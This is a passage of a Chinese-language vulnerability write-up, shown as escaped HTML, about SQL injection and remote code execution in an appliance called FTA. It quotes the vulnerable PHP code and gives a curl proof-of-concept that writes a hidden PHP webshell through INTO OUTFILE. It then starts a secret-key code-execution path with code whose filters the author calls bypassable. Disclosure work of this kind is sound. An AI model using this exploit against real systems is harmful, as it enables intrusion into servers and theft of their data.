    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id  != \&apos;999\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;!(t_mail_server.c_flag &amp;amp; &apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_manager = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_name LIKE \&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%%&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_user_id LIKE \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; 中會將所傳進的參數進行 SQL 語句的拼裝，而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; 為最關鍵的一個函數。
在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; 中可以看到參數皆使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; 來防禦但唯獨缺少 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;，從原始碼的 Coding Style 觀察猜測應該是開發時的疏忽，因此根據程式流程送出對應的參數即可觸發 SQL Injection。&lt;/p&gt;

&lt;p&gt;此外，在 FTA 中資料庫使用者為 root 具有 FILE_PRIV 權限，因此可使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; 撰寫自己 PHP 代碼至可寫目錄達成遠端代碼執行！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&apos; OR 1=1 LIMIT 1 INTO OUTFILE &apos;/home/seos/courier/themes/templates/.cc.php&apos; LINES TERMINATED BY 0x3c3f...#&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;生成的 PHP 檔案位置在&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;在前個弱點中，要達成遠端代碼執行還有一個條件是要存在可寫目錄，但現實中有機率找不到可寫的目錄放置 Webshell，因此無法從 SQL Injection 達成代碼執行，不過這時有另外一條路可以幫助我們達成遠端代碼執行。&lt;/p&gt;

&lt;p&gt;這個弱點的前提條件是 &lt;strong&gt;已知資料庫中所存的加密 KEY&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;這點對我們來說不是問題，從前面的 SQL Injection 弱點可任意讀取資料庫內容，另外雖然在程式碼中有對參數進行一些過濾，但那些過濾是可以繞過的！&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;fc&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/(.+)\(.*\)/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_session_cache&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_user_contact&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;valid_password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_update_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_format_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_email_verified&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_exist_allow_direct_download&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_profile_auth&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/[\\\/&quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(count(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, array(&quot;nickname&quot;=&amp;gt;&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;))));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, &quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
